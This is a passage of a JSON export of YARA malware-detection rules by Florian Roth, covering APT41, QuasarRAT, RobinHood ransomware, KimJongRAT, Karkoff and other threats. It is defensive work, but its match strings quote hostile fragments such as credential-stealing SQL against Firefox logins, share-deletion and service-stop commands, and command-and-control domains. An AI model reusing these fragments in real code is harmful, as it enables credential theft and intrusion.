600KB and ( pe.imphash ( ) == \"b70358b00dd0138566ac940d0da26a03\" or 3 of them )\n}","date":"2019-08-07 10:37:11","description":"Detects APT41 malware HIGHNOON.BIN","minimum_yara":"1.7","name":"APT_APT41_HIGHNOON_BIN_RID2D90","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":["pe"],"rule_hash":"f3b261cb070a29e1b21fd3a954ad08ac","score":90,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_APT41_HIGHNOON_BIN_2_RID2E21 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT41 malware HIGHNOON.BIN\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 11:01:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Double\\\\Door_wh\\\\\" ascii\n      $x2 = \"[Stone] Config --> 2k3 TCP Positive Logout.\" fullword ascii\n      $x3 = \"\\\\RbDoorX64.pdb\" ascii\n      $x4 = \"RbDoor, Version 1.0\" fullword wide\n      $x5 = \"About RbDoor\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}","date":"2019-08-07 11:01:21","description":"Detects APT41 malware HIGHNOON.BIN","minimum_yara":"1.7","name":"APT_APT41_HIGHNOON_BIN_2_RID2E21","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":[],"rule_hash":"a3c4c525699636f7dc6c218c65fa049c","score":85,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule SUSP_Unsigned_GoogleUpdate_RID3117 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious unsigned GoogleUpdate.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-08-05 13:07:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ac1 = { 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C\n               00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65\n               00 00 00 47 00 6F 00 6F 00 67 00 6C 00 65 00 55\n               00 70 00 64 00 61 00 74 00 65 00 2E 00 65 00 78\n               00 65 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and $ac1 and pe.number_of_signatures < 1\n}","date":"2019-08-05 13:07:41","description":"Detects suspicious unsigned GoogleUpdate.exe","minimum_yara":"1.7","name":"SUSP_Unsigned_GoogleUpdate_RID3117","reference":"Internal Research","required_modules":["pe"],"rule_hash":"91e00d2db68fcf601a8d440b0f52b592","score":60,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule SUSP_PowerShell_Caret_Obfuscation_2_RID347B : DEMO OBFUS SCRIPT SUSP T1027 T1086 {\n   meta:\n      description = \"Detects powershell keyword obfuscated with carets\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-07-20 15:32:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, OBFUS, SCRIPT, SUSP, T1027, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $r1 = /p[\\^]?o[\\^]?w[\\^]?e[\\^]?r[\\^]?s[\\^]?h[\\^]?e[\\^]?l\\^l/ ascii wide nocase fullword\n      $r2 = /p\\^o[\\^]?w[\\^]?e[\\^]?r[\\^]?s[\\^]?h[\\^]?e[\\^]?l[\\^]?l/ ascii wide nocase fullword\n   condition: \n      1 of them\n}","date":"2019-07-20 15:32:21","description":"Detects powershell keyword obfuscated with carets","minimum_yara":"1.7","name":"SUSP_PowerShell_Caret_Obfuscation_2_RID347B","reference":"Internal Research","required_modules":[],"rule_hash":"42a5f2b8d0ddd1fc56ec86ef7caadeb3","score":70,"tags":["OBFUS","SUSP","SCRIPT","DEMO","T1027","T1086"]},{"author":"Florian Roth","content":"rule SUSP_DOC_LNK_in_ZIP_RID2D5D : DEMO FILE SUSP T1023 {\n   meta:\n      description = \"Detects suspicious .doc.lnk file in ZIP archive\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/RedDrip7/status/1145877272945025029\"\n      date = \"2019-07-02 10:28:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP, T1023\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".doc.lnk\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and 1 of them\n}","date":"2019-07-02 10:28:41","description":"Detects suspicious .doc.lnk file in ZIP archive","minimum_yara":"1.7","name":"SUSP_DOC_LNK_in_ZIP_RID2D5D","reference":"https://twitter.com/RedDrip7/status/1145877272945025029","required_modules":[],"rule_hash":"7a9fae4a34fcd5fa000e5b1943560cd8","score":50,"tags":["SUSP","DEMO","T1023","FILE"]},{"author":"Florian Roth","content":"rule MAL_AveMaria_RAT_Jul19_RID2E8A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects AveMaria RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/abuse_ch/status/1145697917161934856\"\n      date = \"2019-07-01 11:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"operator co_await\" fullword ascii\n      $s1 = \"uohlyatqn\" fullword ascii\n      $s2 = \"index = [%d][%d][%d][%d]\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2019-07-01 11:18:51","description":"Detects AveMaria RAT","minimum_yara":"1.7","name":"MAL_AveMaria_RAT_Jul19_RID2E8A","reference":"https://twitter.com/abuse_ch/status/1145697917161934856","required_modules":[],"rule_hash":"0c33f6c1668c97bee7f2ad8837edd3ab","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_OfficeDoc_VBA_Base64Decode_RID31DD : DEMO FILE SCRIPT SUSP T1132 {\n   meta:\n      description = \"Detects suspicious VBA code with Base64 decode functions\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/cpaton/Scripting/blob/master/VBA/Base64.bas\"\n      date = \"2019-06-21 13:40:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP, T1132\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"B64_CHAR_DICT\" ascii\n      $s2 = \"Base64Decode\" ascii\n      $s3 = \"Base64Encode\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 60KB and 2 of them\n}","date":"2019-06-21 13:40:41","description":"Detects suspicious VBA code with Base64 decode functions","minimum_yara":"1.7","name":"SUSP_OfficeDoc_VBA_Base64Decode_RID31DD","reference":"https://github.com/cpaton/Scripting/blob/master/VBA/Base64.bas","required_modules":[],"rule_hash":"9538cf14a1584ba3d352b6e786a053fa","score":70,"tags":["SUSP","DEMO","T1132","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule SUSP_VBA_FileSystem_Access_RID30A9 : DEMO FILE SCRIPT SUSP {\n   meta:\n      description = \"Detects suspicious VBA that writes to disk and is activated on document open\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-06-21 12:49:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Common Files\\\\Microsoft Shared\\\\\" wide\n      $s2 = \"Scripting.FileSystemObject\" ascii\n      $a1 = \"Document_Open\" ascii\n      $a2 = \"WScript.Shell\" ascii\n      $a3 = \"AutoOpen\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 100KB and all of ( $s* ) and 1 of ( $a* )\n}","date":"2019-06-21 12:49:21","description":"Detects suspicious VBA that writes to disk and is activated on document open","minimum_yara":"1.7","name":"SUSP_VBA_FileSystem_Access_RID30A9","reference":"Internal Research","required_modules":[],"rule_hash":"24edb8d7c9ab6d68806ba58687ad28b5","score":60,"tags":["SUSP","DEMO","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule SUSP_XMRIG_Reference_RID2E30 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects an executable with a suspicious XMRIG crypto miner reference\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/itaitevet/status/1141677424045953024\"\n      date = \"2019-06-20 11:03:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\xmrig\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}","date":"2019-06-20 11:03:51","description":"Detects an executable with a suspicious XMRIG crypto miner reference","minimum_yara":"1.7","name":"SUSP_XMRIG_Reference_RID2E30","reference":"https://twitter.com/itaitevet/status/1141677424045953024","required_modules":[],"rule_hash":"e0b6c625e54e355ba38eaff0859909fe","score":70,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_Ramnit_May19_1_RID2D35 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Ramnit malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 10:22:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == \"500cd02578808f964519eb2c85153046\"\n}","date":"2019-05-31 10:22:01","description":"Detects Ramnit malware","minimum_yara":"1.7","name":"MAL_Ramnit_May19_1_RID2D35","reference":"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/","required_modules":["pe"],"rule_hash":"6a7025a9d60df2e07f1359a227e870c9","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_XMR_Miner_May19_1_RID2E1B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Monero Crypto Coin Miner\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 11:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"donate.ssl.xmrig.com\" fullword ascii\n      $x2 = \"* COMMANDS     'h' hashrate, 'p' pause, 'r' resume\" fullword ascii\n      $s1 = \"[%s] login error code: %d\" fullword ascii\n      $s2 = \"\\\\\\\\?\\\\pipe\\\\uv\\\\%p-%lu\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and ( pe.imphash ( ) == \"25d9618d1e16608cd5d14d8ad6e1f98e\" or 1 of ( $x* ) or 2 of them )\n}","date":"2019-05-31 11:00:21","description":"Detects Monero Crypto Coin Miner","minimum_yara":"1.7","name":"MAL_XMR_Miner_May19_1_RID2E1B","reference":"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/","required_modules":["pe"],"rule_hash":"f1c8c94f10f74a3f9263522eb92b782f","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Parite_Malware_May19_1_RID3057 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Parite malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 12:35:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"taskkill /im cmd.exe /f\" fullword ascii\n      $s2 = \"LOADERX64.dll\" fullword ascii\n      $x1 = \"\\\\dllhot.exe\" fullword ascii\n      $x2 = \"dllhot.exe --auto --any --forever --keepalive\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2019-05-31 12:35:41","description":"Detects Parite malware","minimum_yara":"1.7","name":"MAL_Parite_Malware_May19_1_RID3057","reference":"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/","required_modules":[],"rule_hash":"ab379c89c88b8803d2f0f0dfbee5ebd6","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Parite_Malware_May19_2_RID3058 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Parite malware based on Imphash\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 12:35:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and ( pe.imphash ( ) == \"b132a2719be01a6ef87d9939d785e19e\" or pe.imphash ( ) == \"78f4f885323ffee9f8fa011455d0523d\" )\n}","date":"2019-05-31 12:35:51","description":"Detects Parite malware based on Imphash","minimum_yara":"1.7","name":"MAL_Parite_Malware_May19_2_RID3058","reference":"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/","required_modules":["pe"],"rule_hash":"9dafb1f065ebdee8eaf0bf034e5bb4f3","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_PDB_CN_Threat_Actor_May19_1_RID3220 : CHINA DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects PDB path user name used by Chinese threat actors\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 13:51:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\zcg\\\\Desktop\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}","date":"2019-05-31 13:51:51","description":"Detects PDB path user name used by Chinese threat actors","minimum_yara":"1.7","name":"SUSP_PDB_CN_Threat_Actor_May19_1_RID3220","reference":"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/","required_modules":[],"rule_hash":"815e94f60802a20bb7bf51b684cbb5a6","score":75,"tags":["SUSP","DEMO","EXE","CHINA","FILE"]},{"author":"Florian Roth","content":"rule EXPL_Strings_CVE_POC_May19_1_RID3091 : DEMO EXE EXPLOIT FILE {\n   meta:\n      description = \"Detects strings used in CVE POC noticed in May 2019\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 12:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Debug\\\\poc_cve_20\" ascii\n      $x2 = \"\\\\Release\\\\poc_cve_20\" ascii\n      $x3 = \"alloc fake fail: %x!\" fullword ascii\n      $x4 = \"Allocate fake tagWnd fail!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}","date":"2019-05-31 12:45:21","description":"Detects strings used in CVE POC noticed in May 2019","minimum_yara":"1.7","name":"EXPL_Strings_CVE_POC_May19_1_RID3091","reference":"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/","required_modules":[],"rule_hash":"5197a37c77a8c98438ec1cfe3e19d3b5","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule HKTL_CN_ProcHook_May19_1_RID2F38 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects hacktool used by Chinese threat groups\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 11:47:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == \"343d580dd50ee724746a5c28f752b709\"\n}","date":"2019-05-31 11:47:51","description":"Detects hacktool used by Chinese threat groups","minimum_yara":"1.7","name":"HKTL_CN_ProcHook_May19_1_RID2F38","reference":"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/","required_modules":["pe"],"rule_hash":"ebec159a06392db2f54b52095be03629","score":75,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule MAL_QuasarRAT_May19_1_RID2E1E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects QuasarRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.ensilo.com/uncovering-new-activity-by-apt10\"\n      date = \"2019-05-27 11:00:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Quasar.Common.Messages\" ascii fullword\n      $x2 = \"Client.MimikatzTools\" ascii fullword\n      $x3 = \"Resources.powerkatz_x86.dll\" ascii fullword\n      $x4 = \"Uninstalling... good bye :-(\" wide fullword\n      $xc1 = { 41 00 64 00 6D 00 69 00 6E 00 00 11 73 00 63 00\n               68 00 74 00 61 00 73 00 6B 00 73 00 00 1B 2F 00\n               63 00 72 00 65 00 61 00 74 00 65 00 20 00 2F 00\n               74 00 6E 00 20 00 22 00 00 27 22 00 20 00 2F 00\n               73 } \n      $xc2 = { 00 70 00 69 00 6E 00 67 00 20 00 2D 00 6E 00 20\n               00 31 00 30 00 20 00 6C 00 6F 00 63 00 61 00 6C\n               00 68 00 6F 00 73 00 74 00 20 00 3E 00 20 00 6E\n               00 75 00 6C 00 0D 00 0A 00 64 00 65 00 6C 00 20\n               00 2F 00 61 00 20 00 2F 00 71 00 20 00 2F 00 66\n               00 20 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 1 of them\n}","date":"2019-05-27 11:00:51","description":"Detects QuasarRAT malware","minimum_yara":"1.7","name":"MAL_QuasarRAT_May19_1_RID2E1E","reference":"https://blog.ensilo.com/uncovering-new-activity-by-apt10","required_modules":[],"rule_hash":"d87071d8ccfacdfc538feca310a97662","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule HKTL_LNX_Pnscan_RID2C57 : DEMO HKTL LINUX T1046 {\n   meta:\n      description = \"Detects Pnscan port scanner\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/ptrrkssn/pnscan\"\n      date = \"2019-05-27 09:45:01\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, LINUX, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-R<hex list>   Hex coded response string to look for.\" fullword ascii\n      $x2 = \"This program implements a multithreaded TCP port scanner.\" ascii wide\n   condition: \n      filesize < 6000KB and 1 of them\n}","date":"2019-05-27 09:45:01","description":"Detects Pnscan port scanner","minimum_yara":"1.7","name":"HKTL_LNX_Pnscan_RID2C57","reference":"https://github.com/ptrrkssn/pnscan","required_modules":[],"rule_hash":"2924df279bcac3ccb3228e1a7b2d28d1","score":55,"tags":["DEMO","LINUX","T1046","HKTL"]},{"author":"Florian Roth","content":"rule APT_ATP28_Sofacy_Indicators_May19_1_RID3357 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects APT28 Sofacy indicators in samples\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1129647994603790338\"\n      date = \"2019-05-18 14:43:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"c:\\\\Users\\\\user\\\\Desktop\\\\openssl-1.0.1e_m\\\\/ssl/cert.pem\" ascii\n      $x2 = \"C:\\\\Users\\\\User\\\\Desktop\\\\Downloader_Poco\" ascii\n      $s1 = \"w%SystemRoot%\\\\System32\\\\npmproxy.dll\" fullword wide\n      $op0 = { e8 41 37 f6 ff 48 2b e0 e8 99 ff ff ff 48 8b d0 } \n      $op1 = { e9 34 3c e3 ff cc cc cc cc 48 8d 8a 20 } \n      $op2 = { e8 af bb ef ff b8 ff ff ff ff e9 f4 01 00 00 8b } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( pe.imphash ( ) == \"f4e1c3aaec90d5dfa23c04da75ac9501\" or 1 of ( $x* ) or ( $s1 and 2 of ( $op* ) ) )\n}","date":"2019-05-18 14:43:41","description":"Detects APT28 Sofacy indicators in samples","minimum_yara":"1.7","name":"APT_ATP28_Sofacy_Indicators_May19_1_RID3357","reference":"https://twitter.com/cyb3rops/status/1129647994603790338","required_modules":["pe"],"rule_hash":"450fac16e86a0bff2ba0ac3b384384d9","score":60,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_RANSOM_RobinHood_May19_1_RID307D : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects RobinHood Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/BThurstonCPTECH/status/1128489465327030277\"\n      date = \"2019-05-15 12:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".enc_robbinhood\" ascii\n      $s2 = \"c:\\\\windows\\\\temp\\\\pub.key\" ascii fullword\n      $s3 = \"cmd.exe /c net use * /DELETE /Y\" ascii\n      $s4 = \"sc.exe stop SQLAgent$SQLEXPRESS\" nocase\n      $s5 = \"main.EnableShadowFucks\" nocase\n      $s6 = \"main.EnableRecoveryFCK\" nocase\n      $s7 = \"main.EnableLogLaunders\" nocase\n      $s8 = \"main.EnableServiceFuck\" nocase\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and 1 of them\n}","date":"2019-05-15 12:42:01","description":"Detects RobinHood Ransomware","minimum_yara":"1.7","name":"MAL_RANSOM_RobinHood_May19_1_RID307D","reference":"https://twitter.com/BThurstonCPTECH/status/1128489465327030277","required_modules":[],"rule_hash":"565531f31816945a6b6fae9789c074d0","score":75,"tags":["RANSOM","MAL","DEMO","EXE","FILE","CRIME"]},{"author":"Florian Roth","content":"rule SUSP_Base64_Encoded_Hex_Encoded_Code_RID3420 : DEMO SUSP T1132 {\n   meta:\n      description = \"Detects hex encoded code that has been base64 encoded\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-04-29 15:17:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1132\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = { 78 34 4e ?? ?? 63 65 44 ?? ?? 58 48 67 } \n      $x2 = { 63 45 44 ?? ?? 58 48 67 ?? ?? ?? 78 34 4e } \n      $fp1 = \"Microsoft Azure Code Signp$\" \n   condition: \n      1 of ( $x* ) and not 1 of ( $fp* )\n}","date":"2019-04-29 15:17:11","description":"Detects hex encoded code that has been base64 encoded","minimum_yara":"1.7","name":"SUSP_Base64_Encoded_Hex_Encoded_Code_RID3420","reference":"Internal Research","required_modules":[],"rule_hash":"f16a6eefcacc80fd779c3d2eb66546cf","score":65,"tags":["SUSP","DEMO","T1132"]},{"author":"Florian Roth","content":"rule APT_NK_BabyShark_KimJoingRAT_Apr19_1_RID339E : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects BabyShark KimJongRAT\"\n      author = \"Florian Roth\"\n      reference = \"https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/\"\n      date = \"2019-04-27 14:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\Microsoft\\\\ttmp.log\" fullword wide\n      $a1 = \"logins.json\" fullword ascii\n      $s1 = \"https://www.google.com/accounts/servicelogin\" fullword ascii\n      $s2 = \"https://login.yahoo.com/config/login\" fullword ascii\n      $s3 = \"SELECT id, hostname, httpRealm, formSubmitURL, usernameField, passwordField, encryptedUsername, encryptedPassword FROM moz_login\" ascii\n      $s4 = \"\\\\mozsqlite3.dll\" fullword ascii\n      $s5 = \"SMTP Password\" fullword ascii\n      $s6 = \"Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or ( $a1 and 3 of ( $s* ) ) )\n}","date":"2019-04-27 14:55:31","description":"Detects BabyShark KimJongRAT","minimum_yara":"1.7","name":"APT_NK_BabyShark_KimJoingRAT_Apr19_1_RID339E","reference":"https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/","required_modules":[],"rule_hash":"ebc44dc8e920ec6c0e70117aceac2a63","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_DropperBackdoor_Keywords_RID3273 : DEMO EXE FILE MAL SUSP {\n   meta:\n      description = \"Detects suspicious keywords that indicate a backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html\"\n      date = \"2019-04-24 14:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x4 = \"DropperBackdoor\" fullword wide ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them\n}","date":"2019-04-24 14:05:41","description":"Detects suspicious keywords that indicate a backdoor","minimum_yara":"1.7","name":"SUSP_DropperBackdoor_Keywords_RID3273","reference":"https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html","required_modules":[],"rule_hash":"6b4257292066d6c3b8d6fafc3dd0af23","score":75,"tags":["SUSP","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_DNSpionage_Karkoff_Malware_Apr19_1_RID34E4 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects DNSpionage Karkoff malware\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html\"\n      date = \"2019-04-24 15:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Karkoff.exe\" fullword wide\n      $x2 = \"kuternull.com\" fullword wide\n      $x3 = \"rimrun.com\" fullword 